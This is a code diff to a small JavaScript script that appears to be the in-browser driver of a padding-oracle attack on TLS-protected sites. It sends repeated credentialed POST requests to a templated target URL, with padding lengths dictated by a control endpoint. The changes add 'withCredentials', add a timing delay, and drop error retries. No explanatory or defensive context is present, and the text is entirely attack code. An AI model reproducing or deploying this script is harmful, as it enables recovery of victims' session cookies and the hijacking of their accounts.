@@ -1,5 +1,6 @@
 var urllen = 0;
-var postlen = 16;
+var postlen = 26;
+var delay = 10;
 
 function strPad(n) {
     if (n > 0) {
@@ -12,6 +13,7 @@ function strPad(n) {
 function performSSLRequest() {
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange = sslRequestHandler;
+    xhr.withCredentials = true;
     xhr.open("POST", "###URL###?" + strPad(urllen));
     xhr.send(strPad(postlen));
 }
@@ -25,7 +27,6 @@ function sslRequestHandler() {
 function queryNextRequest() {
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange = queryNextRequestHandler;
-    xhr.onerror = queryNextRequest;
     xhr.open("GET", "/nextRequest");
     xhr.send(null);
 }
@@ -35,9 +36,8 @@ function queryNextRequestHandler() {
         var res = this.responseText.split(":");
         urllen = Number(res[0]);
         postlen = Number(res[1]);
-        performSSLRequest();
+        setTimeout(performSSLRequest, delay);
     }
 }
-
 
 performSSLRequest();
